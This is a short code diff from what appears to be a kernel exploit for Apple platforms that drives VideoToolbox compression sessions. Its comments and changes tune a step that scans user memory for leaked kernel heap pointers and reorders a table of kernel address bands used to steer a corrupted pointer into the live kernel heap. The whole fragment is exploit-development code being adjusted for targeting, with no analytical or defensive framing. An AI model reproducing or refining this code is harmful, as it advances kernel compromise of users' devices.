@@ -141,8 +141,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     const int32_t W = 1280, H = 720;
     const int32_t sw = 64, sh = 64;
 
-    // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffee4e806580,
-    //    0xfffffe2673806580) so we can steer NTL directly into the live kernel heap band!
+    // 0) Pre-scan userspace RW memory for live ZONE_HEAP kernel pointers (e.g. 0xffffffedfd620000,
+    //    0xffffffe289ee5658) so we can steer NTL directly into the live kernel heap band!
     uint64_t liveKPtrs[8] = {0};
     int liveKPtrCount = 0;
     {
@@ -209,8 +209,8 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
         if (liveSteered != steeredX0) x0cands[ncand++] = liveSteered;
     }
     const uint32_t hiBands[] = {
-        0xFFFFFFE2u, 0xFFFFFFE1u, 0xFFFFFFE0u, 0xFFFFFFDFu, 0xFFFFFFDEu, 0xFFFFFFE4u,
-        0xFFFFFFEEu, 0xFFFFFFEDu, 0xFFFFFFEFu,
+        0xFFFFFFEDu, 0xFFFFFFEFu, 0xFFFFFFE2u, 0xFFFFFFE1u, 0xFFFFFFE0u, 0xFFFFFFDFu,
+        0xFFFFFFDEu, 0xFFFFFFE4u, 0xFFFFFFEEu,
         0xFFFFFE26u, 0xFFFFFE10u, 0xFFFFFE20u, 0xFFFFFE30u, 0xFFFFFE33u
     };
     for (size_t bi = 0; bi < sizeof(hiBands) / sizeof(hiBands[0]) && ncand < 16; bi++) {
